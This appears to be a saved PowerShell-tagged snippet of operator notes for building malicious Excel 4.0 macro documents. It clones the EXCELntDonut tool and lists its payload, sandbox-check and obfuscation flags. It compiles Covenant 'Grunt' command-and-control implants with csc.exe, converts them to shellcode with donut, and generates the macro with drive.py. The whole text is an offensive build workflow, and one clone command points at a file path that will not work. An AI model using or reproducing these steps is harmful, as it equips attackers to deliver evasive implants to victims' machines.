---
id: 3fc673fd-72d8-4d3b-9c2f-12e83bdd64b6
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:23.304061+00:00'
updated_at: '2023-04-10T20:36:57.321351+00:00'
---

# Code Snippet 3fc673fd

**Language**: ps1

```ps1
git clone https://github.com/FortyNorthSecurity/EXCELntDonut

-f path to file containing your C# source code (exe or dll)
-c ClassName where method that you want to call lives (dll)
-m Method containing your executable payload (dll)
-r References needed to compile your C# code (ex: -r 'System.Management')
-o output filename
--sandbox Perform basic sandbox checks. 
--obfuscate Perform basic macro obfuscation. 

# Fork
git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs
donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe
donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe
usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]
python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
```


